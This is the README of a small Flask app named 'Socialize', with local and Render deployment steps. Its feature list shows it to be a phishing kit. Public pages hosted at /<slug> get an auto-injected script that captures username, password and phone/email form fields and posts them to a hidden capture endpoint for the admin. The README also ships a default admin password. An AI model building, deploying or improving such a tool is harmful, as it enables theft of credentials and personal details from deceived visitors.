# Socialize

Repo host + form capture + file manager.

## Run locally (Pydroid 3)
    pip install flask flask-sqlalchemy
    python app.py
Open http://127.0.0.1:5000  (password: socialize123)

## Deploy on Render (free tier)
1. Push this folder to a GitHub repo.
2. Render -> New -> Web Service -> connect the repo. render.yaml is used automatically.
3. Add env vars:
   - ADMIN_PASSWORD = your password
   - DATABASE_URL   = your Neon / Supabase PostgreSQL URL
   - SECRET_KEY     = any random string
4. Deploy.

## Features
- Admin-only dashboard at /
- Public repos at /<slug>  (case-insensitive: /Example and /example both work)
- Upload ZIP -> extracted into the repo
- Create/delete files & folders, move selected items
- Edit files in-browser
- HTML files auto-inject a script that captures forms with id="user-name",
  id="password", id="phone-email" and POSTs to /_capture/<slug>
- Export ZIP (when running locally on Pydroid 3, it's saved to /storage/emulated/0/Download/)
